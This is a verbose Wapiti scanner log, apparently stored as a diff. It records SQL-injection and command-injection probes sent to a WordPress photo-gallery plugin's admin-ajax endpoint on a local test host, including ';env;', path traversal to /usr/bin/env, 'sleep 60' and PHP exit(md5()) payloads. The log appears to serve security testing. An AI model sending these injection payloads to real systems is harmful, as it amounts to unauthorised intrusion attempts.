+2024-03-21 16:48:29.878 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%27%20AND%2083%3D83%20AND%20%2761%27%3D%2761
+2024-03-21 16:48:30.573 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%22%20AND%2069%3D110%20AND%20%2291%22%3D%2291
+2024-03-21 16:48:31.261 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%22%20AND%2076%3D129%20AND%20%2283%22%3D%2283
+2024-03-21 16:48:31.951 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%22%20AND%2031%3D31%20AND%20%2288%22%3D%2288
+2024-03-21 16:48:32.627 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%29%20AND%2017%3D66%20AND%20%2844%3D44
+2024-03-21 16:48:33.304 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%29%20AND%2046%3D123%20AND%20%2815%3D15
+2024-03-21 16:48:33.997 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%29%20AND%2041%3D41%20AND%20%2875%3D75
+2024-03-21 16:48:34.687 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%27%29%20AND%2038%3D106%20AND%20%28%2739%27%3D%2739
+2024-03-21 16:48:35.381 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%27%29%20AND%2069%3D90%20AND%20%28%2793%27%3D%2793
+2024-03-21 16:48:36.063 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%27%29%20AND%2028%3D28%20AND%20%28%2769%27%3D%2769
+2024-03-21 16:48:36.766 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%22%29%20AND%2040%3D104%20AND%20%28%2247%22%3D%2247
+2024-03-21 16:48:37.460 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%22%29%20AND%2026%3D115%20AND%20%28%2220%22%3D%2220
+2024-03-21 16:48:38.152 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%22%29%20AND%2066%3D66%20AND%20%28%2290%22%3D%2290
+2024-03-21 16:48:38.851 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
+2024-03-21 16:48:38.887 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
+2024-03-21 16:48:38.909 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox
+2024-03-21 16:48:40.275 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
+2024-03-21 16:48:40.290 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox
+2024-03-21 16:48:40.291 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=%3Benv%3B&action=GalleryBox
+2024-03-21 16:48:40.966 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=%7Cenv%7C&action=GalleryBox
+2024-03-21 16:48:41.626 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=a%3Benv%3B&action=GalleryBox
+2024-03-21 16:48:42.287 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=a%3Benv%3B&action=GalleryBox
+2024-03-21 16:48:42.948 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&action=GalleryBox
+2024-03-21 16:48:43.603 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz%3Benv%3B&action=GalleryBox
+2024-03-21 16:48:44.260 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz%0Aenv%3B&action=GalleryBox
+2024-03-21 16:48:44.907 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=%26set%26&action=GalleryBox
+2024-03-21 16:48:45.570 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=set&action=GalleryBox
+2024-03-21 16:48:46.239 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=env&action=GalleryBox
+2024-03-21 16:48:46.901 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=%2Fe%00&action=GalleryBox
+2024-03-21 16:48:47.563 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=GalleryBox
+2024-03-21 16:48:48.225 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=GalleryBox
+2024-03-21 16:48:48.887 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=GalleryBox
+2024-03-21 16:48:49.547 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=GalleryBox
+2024-03-21 16:48:50.208 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=GalleryBox
+2024-03-21 16:48:50.871 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=GalleryBox
+2024-03-21 16:48:51.532 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=GalleryBox
+2024-03-21 16:48:52.192 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=GalleryBox
+2024-03-21 16:48:52.851 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=GalleryBox
+2024-03-21 16:48:53.509 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=GalleryBox
+2024-03-21 16:48:54.169 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=GalleryBox
+2024-03-21 16:48:54.830 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=GalleryBox
+2024-03-21 16:48:55.476 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&action=GalleryBox
+2024-03-21 16:48:56.138 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=a%60%29%60&action=GalleryBox
+2024-03-21 16:48:56.798 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=a%60sleep%2060%60&action=GalleryBox
+2024-03-21 16:48:57.456 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=a%3Bsleep%2060%3B&action=GalleryBox
+2024-03-21 16:48:58.115 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=a%7Csleep%2060%3B&action=GalleryBox
+2024-03-21 16:48:58.774 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=%26ping%20-n%2025%20127.0.0.1%26&action=GalleryBox
+2024-03-21 16:48:59.441 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=%3Benv%3B
+2024-03-21 16:49:00.071 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=%7Cenv%7C
+2024-03-21 16:49:00.755 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=a%3Benv%3B
+2024-03-21 16:49:01.402 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=a%3Benv%3B
+2024-03-21 16:49:02.076 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C
+2024-03-21 16:49:02.768 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%3Benv%3B
+2024-03-21 16:49:03.419 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox%0Aenv%3B
+2024-03-21 16:49:04.113 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=%26set%26
+2024-03-21 16:49:04.801 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=set
+2024-03-21 16:49:05.494 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=env
+2024-03-21 16:49:06.184 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=%2Fe%00
+2024-03-21 16:49:06.862 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-21 16:49:07.507 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-21 16:49:08.188 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-21 16:49:08.832 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-21 16:49:09.526 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-21 16:49:10.209 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-21 16:49:10.891 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-21 16:49:11.563 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-21 16:49:12.207 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-21 16:49:12.890 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-21 16:49:13.585 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-21 16:49:14.277 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-21 16:49:14.970 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D
+2024-03-21 16:49:15.643 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=a%60%29%60
+2024-03-21 16:49:16.326 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=a%60sleep%2060%60
+2024-03-21 16:49:17.000 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=a%3Bsleep%2060%3B
+2024-03-21 16:49:17.645 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=a%7Csleep%2060%3B
+2024-03-21 16:49:18.328 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=%26ping%20-n%2025%20127.0.0.1%26
+2024-03-21 16:49:19.024 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module permanentxss
+2024-03-21 16:49:19.047 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/wp-admin/admin-ajax.php (0)
+	data: filter_tag=fuzz&action=GalleryBox
+2024-03-21 16:49:19.716 | GREEN    | wapitiCore.controller.wapiti:write_report:601 - [*] Generating report...
+2024-03-21 16:49:19.777 | SUCCESS  | wapitiCore.controller.wapiti:write_report:603 - A report has been generated in the file ./data/output//photo-gallery.json/
+2024-03-21 16:49:19.777 | SUCCESS  | wapitiCore.controller.wapiti:write_report:605 - Open ./data/output//photo-gallery.json/web_03212024_1646.html with a browser to see this report.
